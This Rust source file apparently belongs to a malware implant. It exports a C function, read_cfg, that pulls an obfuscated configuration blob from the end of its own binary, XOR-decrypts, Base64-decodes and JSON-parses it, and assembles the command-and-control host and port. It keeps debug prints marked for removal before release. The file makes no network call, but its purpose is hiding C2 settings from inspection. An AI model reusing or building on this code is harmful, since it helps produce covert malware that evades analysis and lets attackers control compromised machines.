mod extractor;
mod models;
mod transformer;

#[no_mangle]
/// function designed to read the configuration bytes and
/// return the C2 address. this will read the data from the
/// end of the binary, XOR decrypt it, Base64 decode,
/// JSON decode it, then grab the address and port from the
/// Configuration struct that resulted from the JSON decoding.
pub extern "C" fn read_cfg(raw_key: *const std::ffi::c_char) {
    // check to make sure the key that is input is not null.
    // if it is, return from the function.
    if raw_key.is_null() {
        return;
    }

    // convert the input to a CStr.
    //
    // this borrows the value from the memory that is owned
    // by the caller.
    let key_cstr: &std::ffi::CStr = unsafe { std::ffi::CStr::from_ptr(raw_key) };

    // convert the CStr holding the key to bytes so it can
    // be used later on.
    let key: &[u8] = key_cstr.to_bytes();

    // read configuration bytes from current binary.
    let cfg_bytes: Vec<u8> = match extractor::core::extract_cfg_bytes() {
        Ok(result) => result,
        Err(e) => {
            println!("ERROR READING CFG BYTES: {:#}", e);
            return;
        }
    };

    let decoded: String;
    match transformer::core::transform_payload(key, &cfg_bytes) {
        Ok(result) => decoded = String::from_utf8_lossy(&result).to_string(),
        Err(e) => {
            println!("ERROR DECODING: {:#}", e);
            return;
        }
    }

    // DEVELOPMENT ONLY: remove before release
    println!("DECODED: {:#}", decoded);

    let configuration: models::core::Configuration =
        match transformer::core::deserialize_payload(decoded) {
            Ok(result) => result,
            Err(e) => {
                println!("ERROR DESERIALIZING JSON: {:#}", e);
                return;
            }
        };

    println!("CONFIGURATION: {:#?}", configuration);

    let address: String = format!("{}:{}", configuration.host, configuration.port);
    println!("ADDRESS: {:#}", address);
}
